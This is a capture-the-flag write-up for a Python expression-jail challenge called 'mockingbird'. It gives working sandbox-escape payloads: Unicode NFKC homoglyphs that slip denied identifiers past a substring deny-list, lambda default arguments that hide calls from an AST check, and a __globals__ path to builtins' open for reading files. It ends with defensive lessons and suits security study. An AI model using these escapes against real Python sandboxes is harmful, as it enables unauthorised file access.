# mockingbird — Writeup

**CTF:** Overpass · **Category:** Misc (jail / Python / sandbox) · **Difficulty:** Insane · **Points:** 500
**Flag:** dynamic, format `OVERPASS{...}` (two fragments `A + B`)
**Solver:** [`solve.py`](solve.py) (Python standard library only)

---

## 1. Challenge explanation

> The keeper's mockingbird is a tame thing. It repeats one phrase at a time, and only the phrases two gates allow. There is one song it was told never to sing whole. Teach it to say the parts anyway.

`nc HOST 1342` is a Python **expression jail**. `SAY <expr>` evaluates one expression and returns its `repr()`. `__builtins__` is stripped. A single tame object `perch` is bound in the namespace. Limits: about 40 repeats per connection, a short pause between repeats, a few visits per address.

Two **static gates** run before `eval`:

1. a **lexical** raw-substring deny-list on the submitted text;
2. a **structural** AST walker over the parsed expression.

The flag is `OVERPASS{A+B}`: two fragments stored raw in two separate per-connection files. The service never returns anything flag-shaped in one reply. Per connection, the deny-list spellings, the attribute names of the object graph, the file locations and the fragments are all re-seeded.

Handout side files (`NOTES.txt`, `CHANGES.md`, `RULES.txt`) only contain decoy `OVERPASS{...}` strings (and hidden tag-character text). They are not the flag.

## 2. Step 1 — Recon: two gates, five reactions

| You send | Reply | Meaning |
|---|---|---|
| `1+1` | `2` | ran, returned a value |
| `__class__` | "will not say that" | refused **before** parsing (lexical gate) |
| `(1).__add__(1)` | "cannot shape that" | refused **after** parsing (structural gate: a Call node) |
| `1/0` | "stumbles on that" | ran and raised |
| something huge | "loses its breath" | ran, but hit the resource limit |

One gate reads the **letters** you sent, the other reads the **shape** they parse into. Each refusal is flat and never says which token or shape.

## 3. Step 2 — Lexical bypass with Unicode (NFKC)

`__dict__`, `__globals__`, `open`, `builtins` and similar are refused on sight. But the first gate compares **raw characters**, while Python's tokenizer **NFKC-folds identifiers** (PEP 3131). Replace one ASCII letter of a denied identifier with a compatibility homoglyph:

```
__dict__     ->  __ⁱct__        (ⁱ = U+1D62 folds to "i")
__globals__  ->  __ᵍlobals__    (ᵍ = U+1D4D folds to "g")
__defaults__ ->  __ᵈefaults__
```

The gate sees no denied substring, and the tokenizer restores the real name. Denied text inside **strings** is not normalized, so split those instead: `'op'+'en'`, `'__buil'+'tins__'`.

Now read the perch:

```
SAY perch.__ⁱct__
-> {'lq8': <function _echo ...>, 'olx': <function _echo ...>,
    'ab3': '/tmp/mb_xxxx/v_yyyy/a_zzzz.txt', 'kp1': '/tmp/.../b_wwww.txt', ...}
```

Two functions (one real, one decoy) and two file paths, under per-connection random names.

## 4. Step 3 — The structural gate's blind spot: lambda defaults

Every attempt to **call** something is refused: `f(x)`, `[f(x)]`, `(lambda: f(x))`, `f(x)+''`. The gate rejects Call nodes. But a lambda's **default argument value is evaluated when the lambda is created**, and the gate, which walks a lambda's args and body by hand, never looks inside the defaults. So put the call there and pull the result out:

```
(lambda _= <any call> : _).__ᵈefaults__[0]
```

No Call node appears in any inspected position, yet Python still runs it.

## 5. Step 4 — Reach file I/O, tell the gadget from the decoy

A plain function keeps its defining module's builtins in `__globals__`:

```
perch.<fn>.__ᵍlobals__['__buil'+'tins__']['op'+'en'](<path>).read()
```

Wrap it in the lambda default from step 3 and try each function:

- the **real** carrier returns the file contents;
- the **decoy** returns the same string whatever path you give, so it is not really reading files. Dead end.

## 6. Step 5 — Read the two halves, dodge the output filter

```
SAY (lambda _=perch.olx.__ᵍlobals__['__buil'+'tins__']['op'+'en'](perch.ab3).read(): _).__ᵈefaults__[0]
-> '<fragment A>'
SAY (lambda _=...(perch.kp1).read(): _).__ᵈefaults__[0]
-> '<fragment B>'
```

Each raw fragment is not flag-shaped, so the output filter lets it through. Reading anything whole and `OVERPASS{...}`-shaped (such as the `cage/notice.txt` decoy) returns "will not sing it whole", which is withheld, not leaked. Join the two parts on the client side:

```
OVERPASS{<A><B>}
```

The solver does this in 7 evaluations, well under the 40-query allowance (which is sized for discovery).

## 7. Usage

```bash
python3 solve.py [HOST] [PORT]      # defaults 127.0.0.1 1342
```

## Takeaways

- A raw-substring deny-list is bypassed by anything the interpreter normalizes later. Python NFKC-folds identifiers, so compatibility characters sneak denied names through.
- An AST walker must visit **every** node type that can execute code. Lambda default arguments run at definition time, so they act as an uninspected call site.
- Output filters on the "finished" secret fail when the secret can be read in pieces. Split storage does not help if both pieces are reachable.
